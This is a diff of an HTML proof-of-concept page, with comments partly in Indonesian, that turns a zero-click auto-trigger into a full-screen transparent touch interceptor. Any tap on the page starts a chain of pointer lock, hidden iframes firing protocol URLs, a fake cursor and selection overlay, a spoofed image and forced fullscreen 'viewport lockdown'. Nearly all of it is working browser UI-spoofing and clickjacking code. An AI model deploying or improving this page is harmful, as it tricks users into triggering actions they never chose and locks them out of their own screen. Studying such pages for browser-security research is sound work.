@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
-    <title>Ultimate Auto-Trigger Full-Chain PoC</title>
+    <title>Omnibox Action Hardened PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -46,6 +46,8 @@
         cursor: pointer;
         box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
         transition: transform 0.1s, background 0.2s;
+        position: relative;
+        z-index: 12;
       }
       button:active { background: #b62324; transform: scale(0.98); }
       .info {
@@ -127,29 +129,25 @@
         text-align: left;
         box-shadow: 0 8px 24px rgba(0,0,0,0.5);
       }
+      #touchInterceptor {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        z-index: 11;
+        background: transparent;
+      }
     </style>
-    <script>
-      addEventListener("touchstart", (e) => {
-        let cursor = document.getElementById("fullscreenFakeCursor");
-        if (cursor) {
-          cursor.style.display = "flex";
-        }
-        let input = document.getElementById("focusInput");
-        if (input) input.focus();
-      }, { passive: true });
-
-      addEventListener("touchend", (e) => {
-        let input = document.getElementById("focusInput");
-        if (input) input.blur();
-      }, { passive: true });
-    </script>
   </head>
   <body>
+    <div id="touchInterceptor"></div>
+
     <div id="fullscreenFakeCursor">
       <div>
-        [AUTO_TRIGGER_CHAIN_ACTIVE]<br><br>
-        Attempting zero-click matrix execution.<br>
-        Status: Awaiting user context activation.
+        [HARDENED_ACTION_VECTOR_ACTIVE]<br><br>
+        Simulating intent payload dispatch matrix.<br>
+        Status: Viewport lockdown enforced.
       </div>
     </div>
 
@@ -164,23 +162,29 @@
         <div class="overlap-text" id="overlapContent">
           [SECURE_CONTEXT_OVERLAP_ACTIVE]<br>
           Target DOM Selection Overlap initialized successfully.<br>
-          Status: Forcing context focus and auto-trigger binding...
+          Status: Forcing context focus and deep container locking...
         </div>
       </div>
 
       <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE AUTO-TRIGGER CHAIN</button>
-        <div class="info" id="statusInfo">Status: Ready for auto-execution attempt.</div>
+        <button id="execBtn">INITIALIZE HARDENED ACTION CHAIN</button>
+        <div class="info" id="statusInfo">Status: Ready for interaction. Tap anywhere to engage.</div>
       </div>
     </div>
 
     <script>
       let execButton = document.getElementById("execBtn");
       let statusInfo = document.getElementById("statusInfo");
+      let interceptor = document.getElementById("touchInterceptor");
+      let hasExecuted = false;
 
       async function runChainSequence() {
-        statusInfo.innerText = "Status: Executing automated full-chain sequence...";
+        if (hasExecuted) return;
+        hasExecuted = true;
+
+        statusInfo.innerText = "Status: Executing action vector simulation sequence...";
         execButton.style.display = "none";
+        if (interceptor) interceptor.style.display = "none";
 
         try {
           // 1. Pointer Lock Integration
@@ -199,7 +203,7 @@
               frame.style.display = "none";
               frame.src = proto;
               document.body.appendChild(frame);
-            }, index * 100);
+            }, index * 80);
           });
 
           // 3. Mengaktifkan Fullscreen Fake Cursor & Selection Overlap Layer
@@ -227,7 +231,7 @@
             spoofImg.style.display = "block";
           }
 
-          statusInfo.innerText = "Status: Vectors dispatched. Forcing Fullscreen lock...";
+          statusInfo.innerText = "Status: Vectors dispatched. Enforcing Fullscreen lock...";
 
           // 5. Aggressive Fullscreen Chaining
           setTimeout(async () => {
@@ -255,25 +259,32 @@
               container.style.display = "none";
             }
             
-            statusInfo.innerText = "Status: Auto-trigger chain sequence completed.";
-          }, 250);
+            statusInfo.innerText = "Status: Action vector chain sequence active & locked.";
+          }, 200);
 
         } catch (err) {
           statusInfo.innerText = "Status: Execution error: " + err.message;
           execButton.style.display = "block";
+          if (interceptor) interceptor.style.display = "block";
+          hasExecuted = false;
         }
       }
 
-      // Event listener manual pada tombol
-      execButton.onclick = runChainSequence;
-
-      // Percobaan 0-Click Auto-Trigger saat dokumen selesai dimuat
-      window.addEventListener("DOMContentLoaded", () => {
-        setTimeout(() => {
-          // Memanggil fungsi secara otomatis tanpa menunggu klik manual (akan dibatasi oleh kebijakan browser jika tanpa gestur)
+      if (interceptor) {
+        interceptor.addEventListener("touchstart", (e) => {
+          let input = document.getElementById("focusInput");
+          if (input) input.focus();
           runChainSequence();
-        }, 500);
-      });
+        }, { passive: true });
+
+        interceptor.addEventListener("click", () => {
+          runChainSequence();
+        });
+      }
+
+      execButton.onclick = () => {
+        runChainSequence();
+      };
     </script>
   </body>
 </html>
